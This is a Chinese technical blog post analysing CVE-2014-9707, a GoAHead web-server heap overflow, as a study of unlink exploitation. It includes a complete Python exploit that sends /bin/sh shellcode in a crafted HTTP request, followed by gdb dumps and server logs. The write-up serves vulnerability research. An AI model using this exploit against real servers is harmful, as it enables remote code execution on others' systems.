# 【技术分享】从CVE-2014-9707看unlink漏洞利用
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
****
**作者：k0shl**
**稿费：700RMB（不服你也来投稿啊！）**
**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**
**前言**
最近一直在看泉哥的
《漏洞战争：软件漏洞分析精要》，我接触二进制的时间并不长，但是觉得这本书特别好，最主要的原因是这本书中的漏洞涵盖了绝大多数常见的漏洞类型，而且，每个漏洞都能够还原出一个基本的漏洞模型。
说起漏洞模型，我在前不久碰到一个非常有趣的漏洞，也就是我写这篇文章的主角CVE-2014-9707，一个Linux下服务端软件GoAHead的堆溢出漏洞，在分析完这个漏洞后我发现，这个漏洞可以还原出一个非常有趣而且常见的基本漏洞模型，对于我这样的新人学习Linux下堆溢出漏洞利用有很大的帮助，因此我总结了整个过程与大家分享，最后要感谢fneig、explorer师傅的指导！
**  
**
**漏洞分析**
首先我贴出这个漏洞的PoC
    ```
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    def hex2url(i):
        array = format(i, 'X')
        if len(array) % 2 != 0:
            array = '0' + array
        ret = ''.join('%' + array[i-2:i] for i in xrange(len(array), 0, -2))
        return ret
    def fake(chunk_addr):
        print(hex(chunk_addr))
        chunk = int(hex(chunk_addr)[0:8], 16) + 1
        print(chunk)
        fake_fd = hex(chunk)
        fake_chunk_addr = int(fake_fd + '2f', 16)
        fake_bk = fake_chunk_addr - 8
        return fake_chunk_addr, int(fake_fd, 16), fake_bk
    def make_fake_chunk(chunk_addr):
        chunk = (chunk_addr & ~0xff) + 0x12f
        fd = int(format(chunk, '08X')[:6], 16)
        bk = chunk
        return fd, bk, chunk
    pro = remote('localhost', 80)
    chunk = 0x8057840
    fd, bk, fake_chunk = make_fake_chunk(chunk)
    print(hex(fd), hex(bk), hex(fake_chunk))
    shellcode = '%eb%16%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90'
    shellcode += "%eb%19%5e%31%d2%89%56%07%52%56%89%e1%89%f3%31%c0%b0%0b%cd"
    shellcode += "%80%31%db%31%c0%40%cd%80%e8%e2%ff%ff%ff%2f%62%69"
    shellcode += "%6e%2f%73%68"
    shellcode_addr = fake_chunk + 4 * 4
    offset = 0
    exp = 'GET /'
    exp += hex2url(fd)                 # fd
    exp += hex2url(bk)                 # bk
    exp += hex2url(0xbffff2ac - 20)    # fd_next, stack
    exp += hex2url(shellcode_addr)     # bk_next
    pad = fake_chunk - chunk - 16
    print('pad:{0}'.format(pad))
    # fake chunk
    exp += 'A' * (fake_chunk - chunk - 16)
    exp += hex2url(0x01020304)   # prev_size
    exp += hex2url(0x01020304)   # size
    exp += hex2url(chunk - 8)    # fd
    exp += hex2url(chunk - 8)    # bk
    exp += shellcode
    print('--{}'.format(1024 - (fake_chunk - chunk) - 16 - len(shellcode)/3))
    exp += '/./'
    exp += hex2url(2) * 50
    exp += 'A' * (1024 - (fake_chunk - chunk) - 16 - len(shellcode) / 3 - 50)
    exp += '/.ssss'
    #exp += 'A'*1024
    exp += ' HTTP/1.0rnrn'
    print(len(exp))
    print(exp)
    pro.send(exp)
    ```
这是一个非常有意思的堆溢出漏洞，Goahead是一个知名的Web
Server服务器，在处理传入数据包时，对数据包分别进行了一些处理，在处理之后与之前的长度，没有进行有效的对称，从而导致将后续数据包考入之前申请的缓冲区时，如果后续数据包长度过大，会使之前的缓冲区发生溢出。
之前缓冲区是malloc申请而成，溢出后，可以通过覆盖某些关键指针和变量，来在堆释放时触发unlink，从而导致任意代码执行，下面对此漏洞进行详细分析。
首先运行Goahead，然后通过gdb attach pid附加进程，运行exp，发现程序中断，命中断点。
    ```
    gdb-peda$ c
    Continuing.
    Program received signal SIGABRT, Aborted.
    [----------------------------------registers-----------------------------------]
    EAX: 0x0 
    EBX: 0x545 
    ECX: 0x545 
    EDX: 0x6 
    ESI: 0x45 ('E')
    EDI: 0xb7eec000 --> 0x1a5da8 
    EBP: 0xbffff178 --> 0x805cb28 --> 0x0 
    ESP: 0xbfffeeb4 --> 0xbffff178 --> 0x805cb28 --> 0x0 
    EIP: 0xb7fdebe0 (:     pop    ebp)
    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0xb7fdebdc :        nop
       0xb7fdebdd :        nop
       0xb7fdebde :        int    0x80
    => 0xb7fdebe0 :         pop    ebp
       0xb7fdebe1 :        pop    edx
       0xb7fdebe2 :        pop    ecx
       0xb7fdebe3 :        ret    
       0xb7fdebe4:       int3
    [------------------------------------stack-------------------------------------]
    0000| 0xbfffeeb4 --> 0xbffff178 --> 0x805cb28 --> 0x0 
    0004| 0xbfffeeb8 --> 0x6 
    0008| 0xbfffeebc --> 0x545 
    0012| 0xbfffeec0 --> 0xb7d74307 (:     xchg   ebx,edi)
    0016| 0xbfffeec4 --> 0xb7eec000 --> 0x1a5da8 
    0020| 0xbfffeec8 --> 0xbfffef64 --> 0x77 ('w')
    0024| 0xbfffeecc --> 0xb7d759c3 (:  mov    edx,DWORD PTR gs:0x8)
    0028| 0xbfffeed0 --> 0x6 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGABRT
    ```
通过bt命令可以回溯调用。
    ```
    gdb-peda$ bt
    #0  0xb7fdebe0 in __kernel_vsyscall ()
    #1  0xb7d74307 in __GI_raise (sig=sig@entry=0x6)
        at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
    #2  0xb7d759c3 in __GI_abort () at abort.c:89
    #3  0xb7db26f8 in __libc_message (do_abort=do_abort@entry=0x1, 
        fmt=fmt@entry=0xb7ea865c "*** Error in `%s': %s: 0x%s ***n")
        at ../sysdeps/posix/libc_fatal.c:175
    #4  0xb7db876a in malloc_printerr (action=, 
        str=0xb7ea4138 "corrupted double-linked list", ptr=0x805cb28)
        at malloc.c:4996
    #5  0xb7db95fb in _int_free (av=0xb7eec420 , p=, 
        have_lock=0x0) at malloc.c:3996
    #6  0xb7dbc0c3 in __GI___libc_free (mem=) at malloc.c:2946
    #7  0xb7fb661d in websNormalizeUriPath (
        pathArg=0x805bcc0 "/y05b/y05b230362377277?y05b", 'A' ...) at src/http.c:3238
    #8  0xb7fb8ab3 in parseFirstLine (wp=) at src/http.c:957
    #9  parseIncoming (wp=) at src/http.c:872
    #10 websPump (wp=0x804f560) at src/http.c:826
    #11 0xb7fb906d in readEvent (wp=0x804f560) at src/http.c:799
    #12 socketEvent (sid=0x2, mask=0x2, wptr=0x804f560) at src/http.c:737
    #13 0xb7fc6322 in socketDoEvent (sp=0x804f4b0) at src/socket.c:650
    #14 socketProcess () at src/socket.c:624
    #15 0xb7fb35b5 in websServiceEvents (finished=0x804ab44 )
        at src/http.c:1293
    #16 0x08048c31 in main (argc=0x5, argv=0xbffff4b4, envp=0xbffff4cc)
        at src/goahead.c:146
    #17 0xb7d5fa63 in __libc_start_main (main=0x8048a70 , argc=0x5, 
        argv=0xbffff4b4, init=0x80491e0 , 
        fini=0x8049250 , rtld_fini=0xb7fedc90 , 
        stack_end=0xbffff4ac) at libc-start.c:287
    #18 0x08048f67 in _start ()
    ```
查看一下现在服务器上的情况。
    ```
    /./mean to strcat cannot heap overflow
    goahead: 2: GET /%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%04%03%02%01%04%03%02%01%38%78%05%08%38%78%05%08%eb%16%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%eb%19%5e%31%d2%89%56%07%52%56%89%e1%89%f3%31%c0%b0%0b%cd%80%31%db%31%c0%40%cd%80%e8%e2%ff%ff%ff%2f%62%69%6e%2f%73%68/./%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.0
    *** Error in `goahead': free(): corrupted unsorted chunks: 0x080622c0 ***